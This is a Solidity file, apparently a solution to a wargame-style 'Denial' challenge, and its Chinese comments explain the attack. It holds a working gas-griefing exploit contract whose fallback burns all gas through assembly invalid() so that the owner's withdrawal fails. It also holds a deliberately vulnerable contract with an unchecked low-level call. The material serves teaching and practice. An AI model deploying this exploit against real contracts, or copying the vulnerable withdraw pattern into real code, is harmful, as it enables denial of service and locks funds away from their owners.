// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 1、拒绝owner提款
 *    1）收到钱后用些代码使不能转账到 owner; revert() 会导致 transfer 转账失败
 *    2）call 转账没有查询是否成功 bool, 所以即使 revert，也会继续执行 transfer 给 owner
 *    3）消耗所有 gas， 使不能transfer转账给 owner;
 *       - revert()函数可以回滚当前的交易并抛出异常，但它并不会消耗掉所有的gas。
 *       - 0.8 版本之前可以通过断言 assert(false) 来消耗所有 gas
 *       - 0.8 版本之后可用 assembly 实现同样的功能；
 *
 *
 */

contract Hack {
    constructor(Denial target) {
        target.setWithdrawPartner(address(this));
        target.withdraw();
    }

    // 断言失败时，当前的交易会被回滚并抛出异常,并消耗掉所有的gas。
    fallback() external payable {
        // revert();
        // assert(false);
        assembly {
            invalid()
        }
    }
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // 允许合作伙伴通过调用withdraw函数来提取合约余额的一部分，并将其中的一部分发送给合约所有者。
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
